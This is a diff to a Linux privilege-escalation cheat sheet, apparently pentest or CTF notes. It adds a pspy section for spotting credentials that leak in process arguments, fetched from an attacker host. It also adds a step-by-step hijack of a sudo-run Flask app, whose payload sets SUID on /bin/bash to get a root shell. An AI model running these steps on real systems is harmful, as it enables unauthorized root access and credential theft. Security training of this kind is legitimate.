@@ -13,7 +13,7 @@ tags: [Linux, PrivilegeEscalation]
 
 ### Quick Checks
 
-#Shell #Linux #PrivilegeEscalation
+#Shell #Linux #PrivilegeEscalation #Looting
 Run a first-pass Linux privesc checklist for system context, sudo, SUID/SGID, capabilities, writable paths, cron, processes, and kernel version.
 
 ```sh
@@ -76,7 +76,7 @@ searchsploit linux kernel <VERSION>
 
 ### Automated Audit Scripts
 
-#Shell #Linux #PrivilegeEscalation
+#Shell #Linux #Looting #PrivilegeEscalation
 Download and run LinPEAS or pspy for fast automated Linux privilege escalation triage.
 
 
@@ -109,9 +109,24 @@ chmod +x pspy64
 ./pspy64 -p -i 1000
 ```
 
+### Process Credential Leakage With pspy
+
+#Shell #Linux #Looting #PrivilegeEscalation
+Use `pspy` output to catch cron jobs or root processes that leak credentials in command-line arguments.
+
+```sh
+# Download and run pspy.
+curl http://<LHOST>/pspy64 -o pspy64
+chmod a+x pspy64
+./pspy64
+
+# Look for process args that expose credentials.
+# Example pattern: mysqldump -u <DB_USER> -p<PASS> <DB_NAME>
+```
+
 ### Credential Hunting
 
-#Shell #Linux #Looting
+#Shell #Linux #Looting #PrivilegeEscalation
 Search for credentials in config files, shell history, packet captures, and SSH key material.
 
 ```sh
@@ -357,6 +372,49 @@ sudo -l
 ```sh
 chmod 777 root.sh
 sudo /bin/nice /notes/../home/<USER>/root.sh
+id && whoami
+```
+
+### Sudo Flask Password Changer App Hijack
+
+#Shell #Linux #PrivilegeEscalation
+If sudo allows a custom Flask password changer binary and the app source is writable, replace the app body with a root payload and run it through sudo.
+
+1. Confirm the sudo rule and find the Flask app path from strings.
+
+```sh
+sudo -l
+strings /usr/bin/flask_password_changer | grep -E "route|def |password|GET|POST|cd "
+```
+
+2. Inspect the application directory and confirm `app.py` is writable.
+
+```sh
+ls -la <APP_DIR>
+ls -la <APP_DIR>/app.py
+```
+
+3. Replace `app.py` with a payload that sets SUID on `/bin/bash`.
+
+```python
+import os
+os.system('chmod +s /bin/bash')
+
+from flask import Flask
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    return "pwned"
+```
+
+4. Save the payload, run the sudo binary, and use SUID bash.
+
+```sh
+vi <APP_DIR>/app.py
+sudo /usr/bin/flask_password_changer &
+ls -la /bin/bash
+/bin/bash -p
 id && whoami
 ```
 
